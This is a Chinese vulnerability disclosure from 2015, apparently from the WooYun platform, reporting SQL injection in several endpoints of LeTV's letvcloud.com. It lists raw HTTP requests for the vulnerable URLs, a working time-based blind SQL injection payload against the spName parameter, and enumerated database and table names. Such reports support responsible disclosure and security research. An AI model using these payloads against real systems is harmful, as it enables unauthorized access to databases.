wybug_title: 乐视网某业务多处SQL注射
wybug_detail:
漏洞详情 披露状态：   									2015-05-26：	细节已通知厂商并且等待厂商处理中									2015-05-27：	厂商已经确认，细节仅向厂商公开									2015-06-06：	细节向核心白帽子及相关领域专家公开									2015-06-16：	细节向普通白帽子公开									2015-06-26：	细节向实习白帽子公开									2015-07-11：	细节向公众公开  简要描述： 233 详细说明：  
1，GET /statistics/videoview?enddate=2015-05-25&spName=a&startdate=2015-05-19&stype=normal HTTP/1.1X-Requested-With: XMLHttpRequestReferer: www.letvcloud.comCookie: Host: www.letvcloud.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.0 Safari/537.36Accept: */*2，POST /user/lists HTTP/1.1Content-Length: 223Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: www.letvcloud.comCookie: Host: www.letvcloud.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.0 Safari/537.36Accept: */*begin=1&company=&email=sample%40email.tst&end=1&perpage=20&searchType=3&username=nthyugei3，www.letvcloud.com/statistics/videoview?enddate=2015-05-25&spName=&startdate=2015-05-19&stype=normal4，www.letvcloud.com/video/lists?dosubmit=dosubmit&categoryid=0&penddate=01/01/1967&pstartdate=01/01/1967&searchcontent=the&searchid=&status=0&userid=153658&ut=25.www.letvcloud.com/category/order?act=top&cid=3773
   漏洞证明：  
---Parameter: spName (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: enddate=2015-05-25&spName=a') AND (SELECT * FROM (SELECT(SLEEP(5)))TJsc) AND ('kqoj'='kqoj&startdate=2015-05-19&stype=normal---web application technology: PHP 5.6.2, Nginxback-end DBMS: MySQL >= 5.0.0available databases [2]:[*] bcloud[*] information_uchema[82 tables]                82张表+---------------------+| aipai               || aipai_list          || album_temp          || album_videos_temp   || ganji_video         || l                   || log_source_view     || log_source_view_bak |.。。。。。。。。。。。。。
